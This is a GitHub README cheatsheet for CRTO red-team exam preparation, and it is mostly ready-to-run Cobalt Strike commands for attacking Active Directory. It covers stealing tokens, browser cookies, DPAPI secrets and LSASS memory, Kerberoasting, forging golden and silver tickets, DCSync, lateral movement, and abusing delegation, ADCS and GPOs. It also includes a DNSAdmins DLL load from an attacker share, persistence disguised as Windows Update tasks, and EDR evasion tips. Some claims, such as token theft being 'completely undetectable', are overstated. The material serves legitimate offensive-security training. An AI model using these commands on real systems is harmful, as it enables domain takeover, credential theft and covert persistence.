<div align="center">

# `CRTO CheatSheet`

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![GitHub stars](https://img.shields.io/github/stars/dr34mhacks/CRTO-CheatSheet.svg)](https://github.com/dr34mhacks/CRTO-CheatSheet/stargazers)

</div>

## 🎯 About This Repository

A comprehensive cheatsheet and learning resource created during **CRTO preparation** after extensive lab practice. This repository contains battle-tested commands, techniques, and methodologies that work in modern enterprise environments.

**🎯 Exam Goal:** The CRTO exam is a 48-hour hands-on assessment where the objective is to write a file to the final file server through realistic red team operations.

**Important:** This contains no exam spoilers - only solid red team methodology that works in real-world environments.

---

## 📚 Repository Structure

This repository is organized into sequential modules covering the complete red team attack lifecycle:

| Module | File | Description |
|--------|------|-------------|
| **01** | [Introduction](01.%20introduction.md) | Red team fundamentals and methodology overview |
| **02** | [Malware Essentials](02.%20malware_essential.md) | Core malware concepts for red teamers |
| **03** | [Initial Access](03.%20initial_access.md) | Gaining initial foothold in target environments |
| **04** | [Persistence](04.%20Persistance.md) | Maintaining access across reboots and interruptions |
| **05** | [Post-Exploitation](05.%20post_exploitation.md) | Situational awareness and environment mapping |
| **06** | [Privilege Escalation](06.%20priv_esc.md) | Local and domain privilege escalation techniques |
| **07** | [Credential Access](07.%20cred_access.md) | Harvesting and extracting credentials |
| **08** | [User Impersonation](08.%20user_impersonation.md) | Token manipulation and user impersonation |
| **09** | [Kerberos Attacks](09.%20kerberos.md) | Advanced Kerberos abuse techniques |

---

## 🚀 Quick Start Guide

### For CRTO Exam:
1. **Start here**: Session OPSEC Setup (lines 74-90)
2. **Priority order**: Token theft → DPAPI → Kerberos attacks
3. **Critical commands**: `steal_token`, `execute-assembly ADSearch.exe`, `jump scshell64`
4. **Exam objective**: Write file to final file server (lines 564-600)

### For Red Team Ops:
- Commands tested in Windows 10/11 + Server 2019/2022 environments
- Priority focuses on stealth over speed
- Each section builds operational capability

---

## 🔧 Tools Referenced

**Primary Tools** (all via execute-assembly):
- **Cobalt Strike 4.x** - C2 framework with BOFs enabled
- **Rubeus** - Kerberos attacks (AS-REP, Kerberoasting, Golden/Silver tickets)
- **ADSearch** - LDAP queries without PowerShell dependencies
- **SharpDPAPI** - Browser creds, Wi-Fi passwords, certificates
- **SharpHound** - BloodHound data collection
- **SharpUp** - Privilege escalation enumeration

---

## Initial Assessment & Foothold

### Session OPSEC Setup (Do This First!)

⚠️ **Critical:** Run these commands immediately after getting your initial beacon to improve OPSEC

```bash
# Configure safer process spawning (default rundll32.exe is bad OPSEC)
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe

# Spoof parent process to blend in (choose based on integrity level)
# For medium integrity: Use msedge.exe or other user-level processes
# For high integrity: Use svchost.exe processes running at medium/high integrity
beacon> ps | findstr "svchost\|msedge\|explorer"
beacon> ppid [appropriate-PID]

# Block non-Microsoft DLLs to avoid userland hooks
beacon> blockdlls start

# OPSEC Note: These commands prevent detection by EDR and make child processes look legitimate
```

### First Commands (Always Run These)

**Phase 1: Identity and Context Check**
```bash
# Basic identity and privilege check
beacon> getuid
beacon> whoami /groups
beacon> whoami /priv

# Network and system context
beacon> hostname
beacon> ipconfig /all
beacon> pwd
```

**Phase 2: Immediate Escalation Opportunities**
```bash
# Critical: Look for immediate token theft opportunities
beacon> ps
# Look for: SYSTEM processes, domain admins, service accounts logged in
# Context: steal_token works best from high integrity beacon
# Note: High integrity = admin rights (* symbol), Medium = standard user
```

### Quick Domain Information Gathering

**Why PowerShell over net commands:** PowerShell cmdlets are quieter than traditional `net` commands and blend better with normal admin activity.

```bash
# Get domain info (PowerShell is quieter than net commands)
beacon> powerpick Get-ADDomain
beacon> powerpick Get-ADDomainController
beacon> powerpick Get-ADForest

# Check domain functional level and trusts
beacon> powerpick Get-ADTrust -Filter *
beacon> powerpick (Get-ADDomain).DomainMode
```

---

## Domain Enumeration (OPSEC Priority)

### User Discovery
```bash
# Domain users with ADSearch (much better than net user /domain)
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(objectCategory=user)" --attributes samaccountname,description,pwdlastset,logoncount

# Find privileged users (adminCount=1 means they were/are in admin groups)
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=user)(adminCount=1))" --attributes samaccountname,memberof,pwdlastset

# Service accounts for Kerberoasting (look for old passwords)
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes samaccountname,serviceprincipalname,pwdlastset

# Users with passwords that don't expire (often service accounts)
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" --attributes samaccountname,description
```

### Computer Discovery
```bash
# All computers with useful info
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(objectCategory=computer)" --attributes samaccountname,dnshostname,operatingsystem,lastlogontimestamp

# Servers only (high value targets)
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=computer)(operatingSystem=*Server*))" --attributes samaccountname,dnshostname,operatingsystem

# Find workstations for credential harvesting
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=computer)(!(operatingSystem=*Server*))(lastLogonTimestamp>=*))" --attributes samaccountname,dnshostname,lastlogontimestamp
```

### Group and Access Discovery
```bash
# Privileged groups and their members
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=group)(|(cn=*admin*)(cn=Domain Admins)(cn=Enterprise Admins)(cn=Schema Admins)(cn=DNSAdmins)))" --attributes samaccountname,member

# Find where you have local admin access
beacon> powershell-import C:\Tools\PowerView.ps1
beacon> powerpick Find-LocalAdminAccess

# Comprehensive mapping with BloodHound
beacon> execute-assembly C:\Tools\SharpHound\SharpHound.exe --CollectionMethods All --Domain corp.local --ZipFileName bloodhound_$(hostname).zip
```

---

## Credential Access (Priority Order)

### Priority 1: Token Theft (Zero Detection)
```bash
# Check running processes for valuable tokens
beacon> ps

# Examples of valuable processes to look for:
# PID   Name              User                    Context
# 1234  outlook.exe       CORP\admin-smith       Domain Admin
# 5678  sqlservr.exe      CORP\sql-svc          Service Account
# 892   winlogon.exe      NT AUTHORITY\SYSTEM   Local System
# 1456  explorer.exe      CORP\backup-admin     Backup Admin

# Steal the token (completely undetectable)
beacon> steal_token 1234
# Context: Works best from high integrity beacon
# Requirement: SeDebugPrivilege (usually available to admins)

# Always verify the new context
beacon> getuid
beacon> whoami /groups
# Note: You'll inherit the stolen process's privileges and access rights
```

### Priority 2: DPAPI and Saved Credentials
```bash
# Browser credential extraction (goldmine on user workstations)
beacon> execute-assembly C:\Tools\SharpChrome\SharpChrome.exe logins
beacon> execute-assembly C:\Tools\SharpChrome\SharpChrome.exe cookies

# Windows Credential Manager (saved passwords)
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI.exe credentials /rpc

# Certificate and private key extraction
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI.exe certificates /rpc

# Windows vaults (additional saved creds)
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI.exe vaults /rpc

# Wi-Fi passwords (sometimes contain domain creds)
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI.exe wifi

# RDP saved credentials
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI.exe rdg
```

### Priority 3: Registry and File Hunting
```bash
# Registry password hunting
beacon> reg query HKCU\Software /s /f password /t REG_SZ
beacon> reg query HKLM\SYSTEM\CurrentControlSet\Services /s /f password
beacon> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Common file locations for passwords
beacon> ls C:\Users\Public\
beacon> ls C:\inetpub\wwwroot\web.config
beacon> ls C:\Windows\System32\config\systemprofile\Desktop\

# Search for files with passwords
beacon> powerpick Get-ChildItem -Path C:\ -Include "*.txt","*.ini","*.config","*.xml" -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password\|pwd\|pass" | Select-Object Path,Line
```

### Priority 4: LSASS Memory (High Risk - Use Carefully)
```bash
# Check LSASS process protection level first
beacon> ps lsass

# If PPL (Protected Process Light) is enabled, bypass it
beacon> execute-assembly C:\Tools\PPLKiller\PPLKiller.exe

# Extract only Kerberos keys (quieter than full dump)
beacon> mimikatz !sekurlsa::ekeys

# Extract specific logon session
beacon> mimikatz !sekurlsa::logonpasswords

# Alternative: Process dump for offline analysis (quieter)
beacon> execute-assembly C:\Tools\SqlDumper\SqlDumper.exe [lsass-pid] C:\Windows\Temp\dump.dmp full
```

---

## Kerberos Attacks

### ASREPRoasting (No Authentication Required)
```bash
# Find accounts with "Do not require Kerberos preauthentication"
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes samaccountname

# ASREPRoast specific user
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe asreproast /user:vulnerable-user /format:hashcat /nowrap

# ASREPRoast all vulnerable users
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Alternative with impacket format
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe asreproast /format:john /nowrap
```

### Targeted Kerberoasting
```bash
# Find service accounts with analysis of password age
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes samaccountname,serviceprincipalname,pwdlastset,description

# Target specific high-value service accounts (better than mass kerberoasting)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe kerberoast /user:sql-svc /tgtdeleg /rc4opsec /nowrap

# Kerberoast multiple specific targets
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe kerberoast /spns:MSSQLSvc/db.corp.local:1433,HTTP/web.corp.local /tgtdeleg /rc4opsec /format:hashcat

# Mass kerberoast (noisier but sometimes necessary)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe kerberoast /tgtdeleg /rc4opsec /format:hashcat /outfile:kerberoast_hashes.txt

# Rubeus flags explained:
# /tgtdeleg - Use TGS delegation for better OPSEC
# /rc4opsec - Force RC4 encryption (easier to crack than AES)
# /nowrap - Output on single line for easy copying
```

### Golden Ticket Forging
```bash
# Get domain SID (needed for ticket creation)
beacon> powerpick Get-ADDomain | Select-Object DomainSID

# DCSync krbtgt account (requires replication rights)
beacon> mimikatz !lsadump::dcsync /domain:corp.local /user:krbtgt

# Create golden ticket with AES256 key (preferred - less suspicious)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe golden /aes256:a1b2c3d4e5f6789... /user:administrator /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /nowrap

# Create golden ticket with NTLM hash (fallback option)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe golden /rc4:a1b2c3d4e5f6... /user:administrator /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /nowrap

# Safe ticket injection (don't overwrite current session)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:cmd.exe /domain:corp.local /username:administrator /password:fake /show

beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe ptt /luid:0x12345 /ticket:doIFujCCBZ6gAwIBBaEDAgEWooIEnjCC...

# Steal token from the new process
beacon> steal_token 6789
```

### Silver Ticket Creation
```bash
# Get service account hash
beacon> mimikatz !lsadump::dcsync /domain:corp.local /user:sql-svc

# CIFS service ticket (file system access)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe silver /service:cifs/server.corp.local /rc4:a1b2c3d4... /user:administrator /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /nowrap

# HOST service ticket (scheduled tasks, WMI, services)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe silver /service:host/server.corp.local /rc4:a1b2c3d4... /user:administrator /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /nowrap

# LDAP service ticket (directory access)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe silver /service:ldap/dc.corp.local /rc4:a1b2c3d4... /user:administrator /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /nowrap

# HTTP service ticket (web applications)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe silver /service:http/web.corp.local /rc4:a1b2c3d4... /user:administrator /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /nowrap
```

---

## Lateral Movement (Best to Worst)

### Service Discovery First
```bash
# Check what services are running on target
beacon> powerpick Test-NetConnection server.corp.local -Port 22,445,5985,3389 -InformationLevel Detailed

# Alternative service check
beacon> powerpick Test-WSMan server.corp.local
beacon> powerpick Test-NetConnection server.corp.local -Port 135 -InformationLevel Detailed
```

### Priority 1: SCShell64 (Best Option - BOF Lateral Movement)
```bash
# SCShell64 BOF lateral movement (requires SCShell BOF to be loaded)
beacon> jump scshell64 server.corp.local smb

# Alternative with specific credentials
beacon> make_token CORP\administrator Password123!
beacon> jump scshell64 server.corp.local smb

# Configure SCShell settings if needed
beacon> scshell-settings
beacon> scshell-settings service "Windows Update"
beacon> scshell-settings exepath "C:\Windows\temp\beacon.exe"

# Why SCShell64 is best:
# - BOF (Beacon Object File) runs completely in-memory
# - Uses ChangeServiceConfigA for fileless lateral movement
# - No artifact drops to disk (unless using jump method)
# - Service-based approach blends with normal admin activity
# - Much better OPSEC than traditional methods
```

### Priority 2: WinRM (Best for Admin Accounts)
```bash
# Direct WinRM jump (port 5985/5986)
beacon> jump winrm64 server.corp.local smb

# WinRM with specific credentials
beacon> make_token CORP\administrator Password123!
beacon> jump winrm64 server.corp.local smb

# WinRM with different beacon types
beacon> jump winrm64 server.corp.local https  # HTTPS beacon for stealth
beacon> jump winrm64 server.corp.local dns    # DNS beacon for maximum stealth

# Why WinRM works well:
# - Standard PowerShell remoting
# - Normal admin behavior
# - Encrypted communication
# - Widely enabled in enterprise environments
```

### Priority 3: PSExec (Good for Service Accounts)
```bash
# Standard PSExec jump (port 445)
beacon> jump psexec64 server.corp.local smb

# PSExec with service account context
beacon> make_token CORP\sql-svc ServicePass123!
beacon> jump psexec64 database.corp.local smb

# Why PSExec works for service accounts:
# - Service accounts regularly create other services
# - Expected behavior in enterprise environments
# - No interactive desktop session required
```

### Priority 4: WMI (Backup Method)
```bash
# WMI jump when PSExec fails (port 135)
beacon> jump wmi64 server.corp.local smb

# Manual WMI process creation
beacon> powerpick Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA..." -ComputerName server.corp.local -Credential $cred
```

### Manual Staging (When Automation Fails)
```bash
# File upload to ADMIN$ share
beacon> cd \\server.corp.local\ADMIN$
beacon> upload C:\Payloads\smb_x64.svc.exe windows-defender-update.exe

# Service creation and execution
beacon> sc \\server.corp.local create "WindowsDefenderUpdateSvc" binpath= "C:\Windows\windows-defender-update.exe" start= auto
beacon> sc \\server.corp.local description "WindowsDefenderUpdateSvc" "Provides Windows Defender signature updates"
beacon> sc \\server.corp.local start "WindowsDefenderUpdateSvc"

# Connect to named pipe beacon
beacon> link server.corp.local TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

# Always clean up when done
beacon> sc \\server.corp.local stop "WindowsDefenderUpdateSvc"
beacon> sc \\server.corp.local delete "WindowsDefenderUpdateSvc"
beacon> rm \\server.corp.local\ADMIN$\windows-defender-update.exe
```

### DCOM (Maximum Stealth)
```bash
# MMC20.Application DCOM execution
beacon> powerpick $dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "server.corp.local"))
beacon> powerpick $dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcA...", "7")

# Excel.Application DCOM (if Excel is installed)
beacon> powerpick $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "server.corp.local"))
beacon> powerpick $excel.ExecuteExcel4Macro("EXEC(`"powershell -enc JABzAD0A...`")")

# ShellExecute DCOM method
beacon> powerpick $dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("ShellBrowserWindow", "server.corp.local"))
beacon> powerpick $dcom.ShellExecute("powershell", "-enc JABzAD0A...", "C:\Windows\System32", $null, 0)
```

---

## Privilege Escalation

### Token-Based Escalation (Always Check First)
```bash
# Look for high-privilege processes to steal tokens from
beacon> ps

# Target SYSTEM processes for local privilege escalation:
# winlogon.exe, services.exe, lsass.exe, csrss.exe

# Steal SYSTEM token
beacon> steal_token 892

# Verify escalation
beacon> getuid
beacon> whoami /priv
```

### Service-Based Privilege Escalation
```bash
# Find unquoted service paths
beacon> powerpick Get-WmiObject -Class win32_service | Where-Object {$_.PathName -like "* *" -and $_.PathName -notlike "*`"*"} | Select-Object Name,PathName,StartName,State

# Find modifiable services
beacon> powerpick Get-Acl -Path "C:\Program Files\VulnerableApp\service.exe" | Format-List Owner,AccessToString

# Comprehensive privilege escalation check with SharpUp
beacon> execute-assembly C:\Tools\SharpUp\SharpUp.exe audit

# Check for vulnerable service permissions
beacon> execute-assembly C:\Tools\SharpUp\SharpUp.exe audit ModifiableServices
```

### Registry-Based Escalation
```bash
# AlwaysInstallElevated check (both must be 1)
beacon> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
beacon> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, create and install malicious MSI
beacon> msiexec /quiet /qn /i C:\Temp\payload.msi

# Check for other registry-based escalations
beacon> execute-assembly C:\Tools\SharpUp\SharpUp.exe audit RegistryAutoLogons
beacon> execute-assembly C:\Tools\SharpUp\SharpUp.exe audit RegistrySettings
```

---

## Domain Privilege Escalation

### DCSync Attack (When You Have Replication Rights)
```bash
# Check if current user has DCSync rights
beacon> powerpick Get-ADUser $env:USERNAME -Properties memberof | Select-Object -ExpandProperty memberof

# Alternative check for replication rights
beacon> powerpick Get-ADObject "DC=corp,DC=local" -Properties ntSecurityDescriptor | Select-Object -ExpandProperty ntSecurityDescriptor | Format-List

# DCSync krbtgt account
beacon> mimikatz !lsadump::dcsync /domain:corp.local /user:krbtgt

# DCSync specific users
beacon> mimikatz !lsadump::dcsync /domain:corp.local /user:administrator
beacon> mimikatz !lsadump::dcsync /domain:corp.local /user:"CORP\backup-admin"

# DCSync all accounts (very noisy - use carefully)
beacon> mimikatz !lsadump::dcsync /domain:corp.local /all /csv
```

### ADCS Certificate Abuse
```bash
# Enumerate Certificate Authorities
beacon> execute-assembly C:\Tools\Certify\Certify.exe cas

# Find vulnerable certificate templates
beacon> execute-assembly C:\Tools\Certify\Certify.exe find /vulnerable

# Find all certificate templates
beacon> execute-assembly C:\Tools\Certify\Certify.exe find

# Request certificate with Subject Alternative Name
beacon> execute-assembly C:\Tools\Certify\Certify.exe request /ca:ca-server.corp.local\Corp-CA /template:User /altname:administrator

# Alternative: Request certificate for different user
beacon> execute-assembly C:\Tools\Certify\Certify.exe request /ca:ca-server.corp.local\Corp-CA /template:VulnerableTemplate /altname:domain-admin

# Convert certificate to TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:administrator /certificate:MIIGGjCCBAKgAwIBAgI... /password:cert-password /nowrap
```

### DNSAdmins Privilege Escalation
```bash
# Check if current user is in DNSAdmins group
beacon> whoami /groups | findstr -i dnsadmins
beacon> powerpick Get-ADGroupMember "DNSAdmins" | Where-Object {$_.samAccountName -eq $env:USERNAME}

# Create malicious DLL using Cobalt Strike's artifact kit (better OPSEC than msfvenom)
# Use: Attacks -> Packages -> Windows Executable (S) -> Output: Service DLL
# Or generate raw shellcode and embed it in custom DLL template

# Configure DNS server to load malicious DLL
beacon> dnscmd dc01.corp.local /config /serverlevelplugindll \\attacker-server\share\dns.dll

# Restart DNS service (requires local admin on DNS server)
beacon> sc \\dc01.corp.local stop dns
beacon> sc \\dc01.corp.local start dns
```

### GPO Abuse
```bash
# Find GPOs with write permissions
beacon> powershell-import C:\Tools\PowerView.ps1
beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner"}

# Add computer startup script to GPO
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse.exe --AddComputerScript --ScriptName WindowsUpdate.bat --ScriptContents "powershell.exe -WindowStyle Hidden -EncodedCommand JABzAD0A..." --GPOName "Default Domain Policy"

# Add user logon script to GPO
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse.exe --AddUserScript --ScriptName UserProfile.bat --ScriptContents "powershell.exe -WindowStyle Hidden -EncodedCommand JABzAD0A..." --GPOName "Default Domain Policy"
```

---

## Delegation Attacks

### Unconstrained Delegation
```bash
# Find computers with unconstrained delegation
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# On compromised unconstrained delegation server, monitor for TGTs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /interval:5 /nowrap

# Force authentication from domain controller
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample.exe dc01.corp.local unconstrained-server.corp.local
beacon> execute-assembly C:\Tools\PetitPotam\PetitPotam.exe unconstrained-server.corp.local dc01.corp.local

# Extract captured TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe dump /luid:0x123456 /nowrap

# Use captured TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe ptt /luid:0x789abc /ticket:doIFuj...
```

### Constrained Delegation
```bash
# Find accounts configured for constrained delegation
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=user)(msds-allowedtodelegateto=*))" --attributes samaccountname,msds-allowedtodelegateto

# Find computer accounts with constrained delegation
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes samaccountname,msds-allowedtodelegateto

# Perform S4U2Self and S4U2Proxy attack
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /user:delegated-service /aes256:aes256-key-here /impersonateuser:administrator /msdsspn:cifs/target-server.corp.local /nowrap

# Alternative with NTLM hash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /user:delegated-service /rc4:ntlm-hash-here /impersonateuser:administrator /msdsspn:cifs/target-server.corp.local /nowrap
```

### Resource-Based Constrained Delegation (RBCD)
```bash
# Find computer objects you can write to
beacon> execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(objectCategory=computer)" --attributes samaccountname,msds-allowedtoactonbehalfofotheridentity

# Create computer account for RBCD
beacon> execute-assembly C:\Tools\StandIn\StandIn.exe --computer EvilComputer --make

# Configure RBCD on target computer object
beacon> execute-assembly C:\Tools\StandIn\StandIn.exe --computer target-server --sid S-1-5-21-domain-sid-computer-rid --delegation

# Perform S4U attack to impersonate administrator
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /user:EvilComputer$ /rc4:computer-ntlm-hash /impersonateuser:administrator /msdsspn:cifs/target-server.corp.local /nowrap
```

---

## File Server Access & Objective Completion

### Accessing the File Server
```bash
# List available shares on target file server
beacon> powerpick Get-SmbShare -CimSession fileserver.corp.local
beacon> ls \\fileserver.corp.local\c$
beacon> ls \\fileserver.corp.local\share$

# Check permissions on file server shares
beacon> powerpick Get-SmbShareAccess -Name "share$" -CimSession fileserver.corp.local

# Navigate to target directory
beacon> cd \\fileserver.corp.local\share\target-folder
beacon> ls
```

### Creating and Writing the Objective File
```bash
# Create the required file locally first
beacon> echo "CRTO 2026 - Objective Completed" > C:\Windows\Temp\objective.txt
beacon> echo $(Get-Date) >> C:\Windows\Temp\objective.txt
beacon> echo "User: $(whoami)" >> C:\Windows\Temp\objective.txt
beacon> echo "Host: $(hostname)" >> C:\Windows\Temp\objective.txt

# Upload to target file server
beacon> upload C:\Windows\Temp\objective.txt \\fileserver.corp.local\share\objective.txt

# Alternative: Create file directly on file server
beacon> echo "CRTO 2026 - Objective Completed - $(Get-Date)" > \\fileserver.corp.local\share\objective.txt

# Verify file was created successfully
beacon> ls \\fileserver.corp.local\share\objective.txt
beacon> powerpick Get-Content \\fileserver.corp.local\share\objective.txt

# Clean up local temp file
beacon> rm C:\Windows\Temp\objective.txt
```

---

## Persistence (If Required)

### Scheduled Task Persistence
```bash
# User-level scheduled task
beacon> schtasks /create /tn "Microsoft\Windows\WindowsUpdate\Automatic Updates" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAD0A..." /sc daily /st 14:30 /ru $(whoami)

# System-level scheduled task (requires admin)
beacon> execute-assembly C:\Tools\SharPersist\SharPersist.exe -t schtask -c powershell.exe -a "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAD0A..." -n "MicrosoftEdgeUpdateTaskMachineCore" -m add

# Remove persistence when done
beacon> schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\Automatic Updates" /f
beacon> execute-assembly C:\Tools\SharPersist\SharPersist.exe -t schtask -n "MicrosoftEdgeUpdateTaskMachineCore" -m remove
```

### COM Hijacking Persistence
```bash
# CLSID hijacking for current user
beacon> execute-assembly C:\Tools\SharPersist\SharPersist.exe -t comhijack -c powershell.exe -a "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAD0A..." -k "InprocServer32" -v "C:\Windows\System32\scrobj.dll" -m add

# Cleanup COM hijacking
beacon> execute-assembly C:\Tools\SharPersist\SharPersist.exe -t comhijack -k "InprocServer32" -m remove
```

---

## OPSEC Guidelines (Critical for Success)

### Advanced OPSEC Configuration
```bash
# Malleable C2 Profile Considerations (configured on team server)
# Use realistic user agents, sleep timing, and staging URIs
# Example profile settings that improve stealth:

# Process Injection OPSEC
beacon> inject-technique CreateThread        # Safer than CreateRemoteThread
# Note: Avoid remote process injection when possible

# Memory OPSEC for stageless payloads
# Use Artifact Kit with stack spoofing enabled
# Configure sleep mask to obfuscate beacon in memory

# Named Pipe OPSEC (for SMB beacons)
# Change default pipe names in malleable profile:
# set pipename "msagent_##,win_svc##,spoolss_##,win_svc_##"
```

### Session Management OPSEC
```bash
# Process spawning best practices
beacon> spawnto x64 %windir%\sysnative\svchost.exe    # System process
beacon> spawnto x86 %windir%\syswow64\gpupdate.exe    # Legitimate tool

# Parent process spoofing for legitimacy (integrity-aware)
beacon> ps | findstr "svchost\|msedge\|RuntimeBroker"
# Medium integrity: msedge.exe, RuntimeBroker.exe
# High integrity: svchost.exe (medium/high), winlogon.exe
beacon> ppid [target-PID]

# Block EDR hooks on child processes
beacon> blockdlls start                     # Prevents userland hooks

# Sleep obfuscation (if sleep mask is available)
beacon> sleep 60 25                         # 60 seconds with 25% jitter
```

### Commands to NEVER Use (High Detection)
```bash
# These commands are heavily monitored and will get you caught:
net user /domain                           # Use: powerpick Get-ADUser -Filter *
net group "domain admins" /domain          # Use: powerpick Get-ADGroupMember "Domain Admins"
net localgroup administrators              # Use: powerpick Get-LocalGroupMember -Group "Administrators"
ping -n 1 domain-controller                # Use: powerpick Test-NetConnection dc01 -Port 445
nslookup domain-controller                 # Use: powerpick Resolve-DnsName dc01
nltest /dclist:domain.local                # Use: powerpick Get-ADDomainController
whoami /all                                # Use: getuid and whoami /groups separately
powershell                                 # Use: powerpick or BOFs instead
shell                                      # Use: BOFs or beacon built-ins
run                                        # Use: execute-assembly or BOFs
```

### Preferred Beacon Commands (Lower Detection)
```bash
# Always use beacon built-ins when possible:
beacon> getuid                  # instead of: shell whoami
beacon> ps                      # instead of: shell tasklist /v
beacon> ls                      # instead of: shell dir
beacon> pwd                     # instead of: shell cd
beacon> cd \\server\share       # instead of: shell pushd \\server\share
beacon> rm file.txt             # instead of: shell del file.txt
beacon> mv old.txt new.txt      # instead of: shell move old.txt new.txt

# Use BOFs instead of running executables
beacon> execute-assembly tool.exe           # Better than: run tool.exe
beacon> powerpick Get-ADUser               # Better than: powershell Get-ADUser
```

### Context and Privilege Requirements
```bash
# High Integrity Context Required:
# - steal_token (SeDebugPrivilege needed)
# - mimikatz commands (admin rights required)
# - DCSync attacks (replication rights needed)
# - Service manipulation (admin rights required)

# Medium/Low Integrity Works:
# - DPAPI credential extraction
# - Browser password extraction
# - Registry queries (HKCU)
# - File enumeration (user accessible)
# - ASREPRoasting (no special rights needed)

# Check your beacon integrity level:
beacon> getuid
# Look for * symbol indicating high integrity
```

### Timing and Context Guidelines
```bash
# Timing matters for OPSEC:
# - Admin activities: Business hours (9 AM - 5 PM) look normal
# - Service accounts: Any time (services run 24/7)
# - User activities: Business hours only
# - System maintenance: After hours or weekends

# Context-appropriate activities:
# - Domain enumeration: Use admin accounts during business hours
# - Credential dumping: Avoid unless absolutely necessary
# - Token theft: Always safe (no logs generated)
# - File access: Match user's normal access patterns

# Network behavior considerations:
# - Use DNS beacons in restrictive environments
# - SMB beacons for internal lateral movement
# - HTTP/HTTPS beacons for internet-facing hosts
# - Adjust sleep timing based on environment (longer = more stealth)
```

### Detection Evasion Strategies
```bash
# Memory OPSEC
# Avoid RWX memory permissions - configure in malleable profile
# Use sleep mask to obfuscate beacon when sleeping
# Enable stack spoofing in Artifact Kit

# Network OPSEC
# Use realistic malleable C2 profiles
# Implement domain fronting if possible
# Vary beacon timing and jitter

# Process OPSEC
# Avoid injection into security products
# Use legitimate system processes for spawning
